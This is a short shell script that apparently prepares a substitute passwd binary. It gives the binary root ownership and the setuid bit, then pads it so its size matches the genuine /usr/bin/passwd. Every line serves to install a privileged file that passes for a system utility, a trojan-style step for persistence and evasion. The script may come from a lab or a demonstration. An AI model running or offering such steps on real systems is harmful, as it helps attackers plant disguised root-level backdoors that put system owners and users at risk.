#!/bin/sh
# prepare binary permissions:
sudo chown root:root ./passwd
sudo chmod 755 ./passwd
sudo chmod u+s ./passwd
# padd file size
SSIZE=$(ls -la ./passwd | cut -d' ' -f5)
OSIZE=$(ls -la /usr/bin/passwd | cut -d' ' -f5)
DIFF=$((OSIZE-SSIZE))
sudo truncate -s +$DIFF ./passwd
ls -la ./passwd && ls -la /usr/bin/passwd